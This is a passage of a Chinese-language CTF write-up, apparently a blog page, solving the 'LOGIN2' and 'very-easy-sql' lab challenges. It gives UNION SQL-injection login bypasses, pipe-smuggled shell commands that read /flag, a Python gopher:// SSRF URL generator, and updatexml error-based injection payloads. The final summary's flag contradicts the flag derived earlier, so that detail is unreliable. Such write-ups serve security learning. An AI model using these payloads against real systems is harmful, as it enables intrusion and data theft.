+          <td><code>SELECT ... FROM ... WHERE ...</code></td>
+          <td><code>HANDLER ... OPEN / READ / CLOSE</code></td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="login2">LOGIN2
+</h3><p>进入题目界面是一个登录页面，打开开发者工具，发现一串编码，解码一下</p>
+<p><img src="/lyeve.github.io/p/bugku/img49.png"
+	width="776"
+	height="294"
+	srcset="/lyeve.github.io/p/bugku/img49_hu_baada6bfaa45e523.png 480w, /lyeve.github.io/p/bugku/img49_hu_49ef0c04d16506a6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="633px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$sql=&#34;SELECT username,password FROM admin WHERE username=&#39;&#34;.$username.&#34;&#39;&#34;;//从admin表中查询用户名密码
+</span></span><span class="line"><span class="cl">if (!empty($row) &amp;&amp; $row[&#39;password&#39;]===md5($password)){
+</span></span><span class="line"><span class="cl">}   验证登录的密码和md5加密的
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果查到了用户，并且数据库中的 <code>password</code> 字段 <strong>等于</strong> 用户输入密码的 <code>md5</code> 值，则认证通过。</li>
+<li>注意：这里 <strong>没有对密码做预处理</strong>，直接 <code>md5($password)</code>，所以能控制查询结果，就可以绕过。
+我们在用户名输入  &rsquo; UNION SELECT &lsquo;admin&rsquo;,&rsquo;e10adc3949ba59abbe56e057f20f883e&rsquo; &ndash;
+就会执行
+SELECT username,password FROM admin WHERE username=&rsquo; '
+UNION SELECT &lsquo;admin&rsquo;,&rsquo;e10adc3949ba59abbe56e057f20f883e&rsquo; &ndash; &lsquo;;
+然后密码输入123456   e10adc3949ba59abbe56e057f20f883e(123456md5加密结果)</li>
+</ul>
+<p><img src="/lyeve.github.io/p/bugku/img50.png"
+	width="855"
+	height="322"
+	srcset="/lyeve.github.io/p/bugku/img50_hu_a4d6db9211625c27.png 480w, /lyeve.github.io/p/bugku/img50_hu_6315b19eb50960ec.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="637px"
+	
+></p>
+<p>输入Is,可以查看进程
+但是没有回显对应的进程内容，  用 sh shell 执行 ps -aux | grep 输入框传入的命令</p>
+<p><img src="/lyeve.github.io/p/bugku/img51.png"
+	width="609"
+	height="254"
+	srcset="/lyeve.github.io/p/bugku/img51_hu_df50d2ab5a28a7ff.png 480w, /lyeve.github.io/p/bugku/img51_hu_ea1bec59f1f40ab2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+>
+输入ls / &gt; 1.txt    这个命令是将<strong>系统根目录（/）</strong> 的所有文件和目录列表写入到当前目录下的 <code>1.txt</code> 文件中
+但是执行这个命令后，在地址栏输入1.txt可以访问，但是内容是空
+这是由于实际命令被拼接到了ps -aux | grep ls / &gt; 1.txt   就会导致报错</p>
+<p><img src="/lyeve.github.io/p/bugku/img52.png"
+	width="940"
+	height="251"
+	srcset="/lyeve.github.io/p/bugku/img52_hu_8f115e55a2931fe6.png 480w, /lyeve.github.io/p/bugku/img52_hu_fb6cb139f941c7f8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="374"
+		data-flex-basis="898px"
+	
+></p>
+<p>如果要让Is命令作为单独的命令使用可以采用管道分隔符
+<code>任意字符 | ls / &gt; 1.txt</code>
+这样就可以看到目录列表</p>
+<p><img src="/lyeve.github.io/p/bugku/img53.png"
+	width="691"
+	height="576"
+	srcset="/lyeve.github.io/p/bugku/img53_hu_e05bdb1653e556c9.png 480w, /lyeve.github.io/p/bugku/img53_hu_a6f15c89c6661d8d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="287px"
+	
+></p>
+<p>看到了flag文件
+继续输入=<code>xxx| cat /flag&gt;2.txt</code>
+然后访问2.txt就可以看到flag了</p>
+<p><img src="/lyeve.github.io/p/bugku/img54.png"
+	width="716"
+	height="149"
+	srcset="/lyeve.github.io/p/bugku/img54_hu_62b200bb592cce2f.png 480w, /lyeve.github.io/p/bugku/img54_hu_b0836603570532.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="480"
+		data-flex-basis="1153px"
+	
+></p>
+<h4 id="总结">总结
+</h4><p>sql联合注入加webshell写入文件读取
+当网页没有命令返回内容，试试用写入文件的方式绕过，我们发现了服务器上的根目录有个 flag 文件（注意不是 Web 网页服务的根目录，所以你访问 网址/flag 是没有任何内容的）</p>
+<h3 id="very-easy-sql">very-easy-sql
+</h3><p>进入后是一个登录界面，然后查看源码发现有一个use.php
+<img src="/lyeve.github.io/p/bugku/img57.png"
+	width="728"
+	height="209"
+	srcset="/lyeve.github.io/p/bugku/img57_hu_c385db3ce8694665.png 480w, /lyeve.github.io/p/bugku/img57_hu_8a647d64ec6287a1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="348"
+		data-flex-basis="835px"
+	
+></p>
+<p><img src="/lyeve.github.io/p/bugku/img58.png"
+	width="572"
+	height="459"
+	srcset="/lyeve.github.io/p/bugku/img58_hu_de281780523d3908.png 480w, /lyeve.github.io/p/bugku/img58_hu_f7472703f75657be.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="299px"
+	
+>
+访问一下  curl命令是用来对服务器发起请求的，我们还要用本地内部账户进行请求，
+可以确定攻击方向，利用 use.php 页面中的 curl 命令进行 SSRF 攻击，攻击的目标就是靶场首页的登录框。</p>
+<p>再补充学习一些gopher协议
+<strong>Gopher</strong> 是一个在万维网（WWW）流行之前的<strong>分布式文档搜索和检索协议</strong>，它能<strong>将任意 TCP 流量封装在 URL 中</strong>，可构造任意协议请求（如 MySQL、Redis、HTTP 等）
+标准格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt;</code>
+<img src="/lyeve.github.io/p/bugku/img60.png"
+	width="720"
+	height="252"
+	srcset="/lyeve.github.io/p/bugku/img60_hu_b0db3da17bff47db.png 480w, /lyeve.github.io/p/bugku/img60_hu_2f4ceeb38b4b740d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="685px"
+	
+></p>
+<p>工作流程</p>
+<ol>
+<li>客户端请求 <code>gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1...</code></li>
+<li>服务器解析 URL，提取 <code>_</code> 后的内容</li>
+<li>建立到 <code>127.0.0.1:80</code> 的 TCP 连接</li>
+<li><strong>将解码后的 payload 原样发送</strong>给目标服务</li>
+<li>将目标服务的响应返回给客户端
+<img src="/lyeve.github.io/p/bugku/img59.png"
+	width="393"
+	height="222"
+	srcset="/lyeve.github.io/p/bugku/img59_hu_a7dfd5cf30f40be2.png 480w, /lyeve.github.io/p/bugku/img59_hu_dace3bef473b9c09.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="424px"
+	
+></li>
+</ol>
+<p>原请求包如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">  Host: 61.147.171.105:61845
+</span></span><span class="line"><span class="cl">   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Cookie: this_is_your_cookie=inner_user
+</span></span><span class="line"><span class="cl">DNT: 1
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而我们用gopher协议伪造的请求包只需要包含以下内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> POST / HTTP/1.1
+</span></span><span class="line"><span class="cl"> Host: 61.147.171.105:65176
+</span></span><span class="line"><span class="cl"> Content-Length: 20
+</span></span><span class="line"><span class="cl"> Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl"> uname=123&amp;passwd=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;uname=123&amp;passwd=123&#34;</span>  <span class="c1"># 请求包中的 payload  </span>
+</span></span><span class="line"><span class="cl"><span class="n">template</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;\  
+</span></span></span><span class="line"><span class="cl"><span class="s2">POST / HTTP/1.1  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host: {}  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: {}  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded  
+</span></span></span><span class="line"><span class="cl"><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">{}  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gopher_data</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;  
+</span></span></span><span class="line"><span class="cl"><span class="s2">    :param string: 待转换的请求包  
+</span></span></span><span class="line"><span class="cl"><span class="s2">    :return:  
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>    <span class="n">encode_result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>  <span class="c1"># 进行 url 编码  </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 回车 \n -&gt; url 编码后 -&gt; %0A -&gt; 将 %0A 替换为 %0D%0A; 数据包模板末尾有一个换行，就不用额外添加 %0D%0A 了  </span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;gopher://{}/_{}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">encode_result</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span> <span class="s2">&#34;%0D%0A&#34;</span><span class="p">))</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">gopher_data</span><span class="p">(</span><span class="n">template</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行代码得到了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Length%3A%2020%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3D123%26passwd%3D123%0D%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后复制到url提交</p>
+<p><img src="/lyeve.github.io/p/bugku/img56.png"
+	width="1072"
+	height="496"
+	srcset="/lyeve.github.io/p/bugku/img56_hu_778b77b84a2bbd8e.png 480w, /lyeve.github.io/p/bugku/img56_hu_943e5d75ec27df2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+>
+把uname和passwd换为admin弱密码进行尝试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Length%3A%2024%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3Dadmin%26passwd%3Dadmin%0D%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就有了set-cookie:</p>
+<p><img src="/lyeve.github.io/p/bugku/img61.png"
+	width="1089"
+	height="519"
+	srcset="/lyeve.github.io/p/bugku/img61_hu_8b9afe21e53d821f.png 480w, /lyeve.github.io/p/bugku/img61_hu_32dc61b6cfce24d4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+>
+解码后得到了是admin</p>
+<p><img src="/lyeve.github.io/p/bugku/img62.png"
+	width="1093"
+	height="479"
+	srcset="/lyeve.github.io/p/bugku/img62_hu_dc10b6a001d3f1b.png 480w, /lyeve.github.io/p/bugku/img62_hu_80b6a60a1ea361f4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="547px"
+	
+></p>
+<p>利用脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">base64</span>  
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">80</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">HTTP_TEMPLATE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;POST / HTTP/1.1  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host: {ip}  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: 0  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie: this_is_your_cookie={payload}  
+</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close  
+</span></span></span><span class="line"><span class="cl"><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_gopher_url</span><span class="p">(</span><span class="n">sql_payload</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1"># Base64 编码 SQL payload    b64_payload = base64.b64encode(sql_payload.encode()).decode()  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1"># 填充 HTTP 模板（注意：Host 不包含端口）  </span>
+</span></span><span class="line"><span class="cl">    <span class="n">http_request</span> <span class="o">=</span> <span class="n">HTTP_TEMPLATE</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span><span class="o">=</span><span class="n">TARGET_IP</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">=</span><span class="n">b64_payload</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1"># 转换为 Gopher 格式  </span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">http_request</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="n">encoded</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;%0A&#39;</span><span class="p">,</span> <span class="s1">&#39;%0D%0A&#39;</span><span class="p">)</span>  <span class="c1"># 修复换行符  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">f</span><span class="s2">&#34;gopher://{TARGET_IP}:{TARGET_PORT}/_{encoded}&#34;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;admin&#39;&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">gopher_url</span> <span class="o">=</span> <span class="n">generate_gopher_url</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;✅ 生成的 Gopher URL（直接复制到 use.php 表单中）:&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">gopher_url</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先测试一些playload：admin&rsquo;</p>
+<p>发现有报错回显：</p>
+<p><img src="/lyeve.github.io/p/bugku/img63.png"
+	width="1523"
+	height="347"
+	srcset="/lyeve.github.io/p/bugku/img63_hu_12552219de6f4c76.png 480w, /lyeve.github.io/p/bugku/img63_hu_3c825c5244660741.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="438"
+		data-flex-basis="1053px"
+	
+></p>
+<p>可以用报错注入：</p>
+<p><code>payload：admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</code></p>
+<p>得到了四个表：</p>
+<p><img src="/lyeve.github.io/p/bugku/img64.png"
+	width="653"
+	height="136"
+	srcset="/lyeve.github.io/p/bugku/img64_hu_9566adf725c7ab64.png 480w, /lyeve.github.io/p/bugku/img64_hu_c97597e732999c00.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="480"
+		data-flex-basis="1152px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="p">:</span><span class="s2">&#34;&#34;&#34;admin&#39;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#34;flag&#34;),0x7e),1) #&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到了flag表中只有一列flag</p>
+<p><img src="/lyeve.github.io/p/bugku/img65.png"
+	width="412"
+	height="148"
+	srcset="/lyeve.github.io/p/bugku/img65_hu_4eb5f2a21224b844.png 480w, /lyeve.github.io/p/bugku/img65_hu_921c073fa4b897f8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="err">：</span><span class="n">admin</span><span class="s1">&#39;) and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1) #</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于upadatexml()对返回的字符限制为32个
+所以得到了前半部分flag~cyberpeace{459c4b9188f4ad1cef05</p>
+<p><img src="/lyeve.github.io/p/bugku/img66.png"
+	width="627"
+	height="137"
+	srcset="/lyeve.github.io/p/bugku/img66_hu_f2d3ec5f425248a0.png 480w, /lyeve.github.io/p/bugku/img66_hu_266d41d17a62e6d7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="457"
+		data-flex-basis="1098px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;admin&#39;) and updatexml(1,concat(0x7e,(select mid(group_concat(flag),20,50) from flag),0x7e),1) #&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到了后半部分flag：   <del>88f4ad1cef05a0f1282306a1}</del></p>
+<p><img src="/lyeve.github.io/p/bugku/img67.png"
+	width="601"
+	height="155"
+	srcset="/lyeve.github.io/p/bugku/img67_hu_f407c99d6e05952a.png 480w, /lyeve.github.io/p/bugku/img67_hu_4937ded35c201497.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="930px"
+	
+>
+flag：cyberpeace{459c4b9188f4ad1cef05a0f1282306a1}</p>
+<h4 id="总结-1">总结：
+</h4><p>这道题目是ssrf和gopher协议以及sql报错注入的综合题目
+通过use.php页面，以及内网只能对内访问，gopher可以构造任意tcp流量，mysql中的updatexml()函数，触发xpath错误，</p>
+<p>完整攻击流程</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>步骤</th>
+          <th>操作</th>
+          <th>目的</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>访问 <code>/use.php</code></td>
+          <td>发现 SSRF 入口点</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>构造基础 Gopher URL</td>
+          <td>访问内网登录页面</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>使用弱口令 <code>admin/admin</code></td>
+          <td>获取有效 Cookie 值</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>识别 SQL 注入点</td>
+          <td>分析 Cookie 中的漏洞</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>探测数据库结构</td>
+          <td>获取表名/列名信息</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>分段提取 flag</td>
+          <td>绕过 32 字符限制</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>拼接完整 flag</td>
+          <td><code>cyberpeace{a0e9c720fecbd276d9f611e262249a87}</code></td>
+      </tr>
+  </tbody>
+</table></div>
 
 </section>
 
